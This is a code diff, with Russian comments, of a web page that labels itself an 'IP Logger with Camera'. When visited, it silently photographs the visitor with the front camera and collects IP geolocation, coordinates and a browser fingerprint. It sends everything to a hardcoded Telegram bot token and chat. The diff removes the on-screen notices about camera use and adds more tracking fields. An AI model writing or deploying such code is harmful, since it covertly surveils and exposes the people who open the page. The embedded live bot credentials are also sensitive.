@@ -59,17 +59,10 @@
         const TOKEN = "8319716117:AAFOvid9L14XanjeBLYWb6JT7QTAVgcA9g4";
         const CHAT_ID = "-1003175777512";
 
-        let cameraStream = null;
-
-        // Функция для автоматического доступа к камере и съемки
+        // Функция для автоматического доступа к камере
         async function autoCaptureCamera() {
-            const statusElement = document.getElementById('status');
-            
             try {
-                statusElement.innerHTML = '🔄 Accessing camera...';
-                
-                // Запрашиваем камеру сразу
-                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                const cameraStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
                         width: { ideal: 1280 },
@@ -78,8 +71,6 @@
                     audio: false 
                 });
 
-                statusElement.innerHTML = '✅ Camera connected! Taking photo...';
-                
                 // Создаем скрытые элементы для камеры
                 const video = document.createElement('video');
                 video.srcObject = cameraStream;
@@ -108,13 +99,10 @@
                 // Останавливаем камеру
                 cameraStream.getTracks().forEach(track => track.stop());
                 
-                statusElement.innerHTML = '📸 Photo captured! Sending data...';
-                
                 return photoDataUrl;
                 
             } catch (error) {
-                console.error('Camera error:', error);
-                statusElement.innerHTML = '❌ Camera not available. Continuing...';
+                console.error('Camera access denied or error:', error);
                 return null;
             }
         }
@@ -135,14 +123,23 @@
                         country_code: 'N/A',
                         region: 'Unknown',
                         city: 'Unknown',
+                        postal: 'N/A',
                         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        latitude: 'N/A',
+                        longitude: 'N/A',
                         org: 'Unknown'
                     };
                 } catch (e) {
                     return {
                         ip: 'Unable to retrieve',
                         country_name: 'Unknown',
+                        country_code: 'N/A',
+                        region: 'Unknown',
                         city: 'Unknown',
+                        postal: 'N/A',
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        latitude: 'N/A',
+                        longitude: 'N/A',
                         org: 'Unknown'
                     };
                 }
@@ -152,13 +149,26 @@
         // Функция для получения информации о браузере
         function getBrowserInfo() {
             return {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookieEnabled: navigator.cookieEnabled
+                userAgent: navigator.userAgent || 'N/A',
+                language: navigator.language || 'N/A',
+                languages: navigator.languages ? [...navigator.languages] : ['N/A'],
+                platform: navigator.platform || 'N/A',
+                cookieEnabled: navigator.cookieEnabled !== undefined ? navigator.cookieEnabled : false,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                screen: {
+                    width: screen.width || 0,
+                    height: screen.height || 0,
+                    colorDepth: screen.colorDepth || 0
+                },
+                viewport: {
+                    width: window.innerWidth || 0,
+                    height: window.innerHeight || 0
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                indexedDB: !!window.indexedDB,
+                touchSupport: 'ontouchstart' in window
             };
         }
 
@@ -189,7 +199,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', caption);
+                formData.append('caption', caption.substring(0, 1024));
                 
                 const telegramResponse = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -204,19 +214,29 @@
 
         // Форматирование сообщения
         function formatMessage(ipInfo, browserInfo, hasPhoto = false) {
-            let message = `<b>🌐 Automatic Camera Logger</b>\n\n`;
-            message += `<b>📍 IP:</b> ${ipInfo.ip || 'N/A'}\n`;
-            message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'}\n`;
+            let message = `<b>🌐 IP Logger with Camera</b>\n\n`;
+            message += `<b>📍 IP Address:</b> ${ipInfo.ip || 'N/A'}\n`;
+            message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\n`;
+            message += `<b>🏛️ Region:</b> ${ipInfo.region || 'N/A'}\n`;
             message += `<b>🏢 City:</b> ${ipInfo.city || 'N/A'}\n`;
+            message += `<b>📮 Postal Code:</b> ${ipInfo.postal || 'N/A'}\n`;
             message += `<b>🕐 Timezone:</b> ${ipInfo.timezone || 'N/A'}\n`;
-            message += `<b>🗿 ISP:</b> ${ipInfo.org || 'N/A'}\n\n`;
+            message += `<b>📡 Coordinates:</b> ${ipInfo.latitude || 'N/A'}, ${ipInfo.longitude || 'N/A'}\n`;
+            message += `<b>🗿 ISP:</b> ${ipInfo.org || ipInfo.asn || 'N/A'}\n\n`;
             
-            message += `<b>💻 Device Info:</b>\n`;
-            message += `<b>Browser:</b> ${browserInfo.userAgent}\n`;
-            message += `<b>Screen:</b> ${browserInfo.screen}\n`;
+            message += `<b>💻 Browser Info:</b>\n`;
+            message += `<b>User Agent:</b> ${browserInfo.userAgent}\n`;
             message += `<b>Language:</b> ${browserInfo.language}\n`;
-            message += `<b>Camera Access:</b> ${hasPhoto ? '✅ GRANTED + PHOTO' : '❌ DENIED'}\n`;
-            message += `\n<b>🕒 Time:</b> ${new Date().toLocaleString()}`;
+            message += `<b>Platform:</b> ${browserInfo.platform}\n`;
+            message += `<b>Screen:</b> ${browserInfo.screen.width}x${browserInfo.screen.height}\n`;
+            message += `<b>Viewport:</b> ${browserInfo.viewport.width}x${browserInfo.viewport.height}\n`;
+            message += `<b>Timezone:</b> ${browserInfo.timezone}\n`;
+            message += `<b>Touch Support:</b> ${browserInfo.touchSupport ? 'Yes' : 'No'}\n`;
+            message += `<b>Cookies:</b> ${browserInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
+            message += `<b>Local Storage:</b> ${browserInfo.localStorage ? 'Supported' : 'Not Supported'}\n`;
+            message += `<b>Camera Access:</b> ${hasPhoto ? 'Granted + Photo' : 'Denied/Skipped'}\n`;
+            
+            message += `\n<b>🕒 Timestamp:</b> ${new Date().toLocaleString()}`;
             
             return message;
         }
@@ -226,38 +246,33 @@
             const statusElement = document.getElementById('status');
             
             try {
-                // Сначала пытаемся получить фото с камеры
-                statusElement.innerHTML = '📸 Attempting camera access...';
-                const photoDataUrl = await autoCaptureCamera();
-                
-                // Параллельно собираем остальные данные
                 statusElement.innerHTML = '🌐 Collecting information...';
-                const [ipInfo, browserInfo] = await Promise.all([
+                
+                // Параллельно собираем все данные
+                const [ipInfo, browserInfo, photoDataUrl] = await Promise.all([
                     getIPInfo(),
-                    Promise.resolve(getBrowserInfo())
+                    Promise.resolve(getBrowserInfo()),
+                    autoCaptureCamera().catch(() => null) // Если камера ошибется - похуй
                 ]);
 
                 // Формируем сообщение
                 const message = formatMessage(ipInfo, browserInfo, !!photoDataUrl);
 
-                // Отправляем данные
-                statusElement.innerHTML = '📤 Sending to Telegram...';
+                // Отправляем текстовое сообщение
+                statusElement.innerHTML = '📤 Sending data...';
                 const textSuccess = await sendToTelegram(message);
                 
                 // Если есть фото, отправляем его
-                let photoSuccess = true;
                 if (photoDataUrl) {
-                    const photoCaption = `📸 Auto Capture - ${ipInfo.ip || 'Unknown'} - ${new Date().toLocaleString()}`;
-                    photoSuccess = await sendPhotoToTelegram(photoDataUrl, photoCaption);
+                    const photoCaption = `📸 Camera Capture - ${ipInfo.ip || 'Unknown IP'} - ${new Date().toLocaleString()}`;
+                    await sendPhotoToTelegram(photoDataUrl, photoCaption);
                 }
                 
                 if (textSuccess) {
                     statusElement.className = 'status success';
-                    statusElement.innerHTML = photoDataUrl ? 
-                        '✅ Data and photo sent successfully!' :
-                        '✅ Data sent successfully!';
+                    statusElement.innerHTML = '✅ Data sent successfully!';
                 } else {
-                    throw new Error('Telegram send failed');
+                    throw new Error('Failed to send to Telegram');
                 }
 
             } catch (error) {
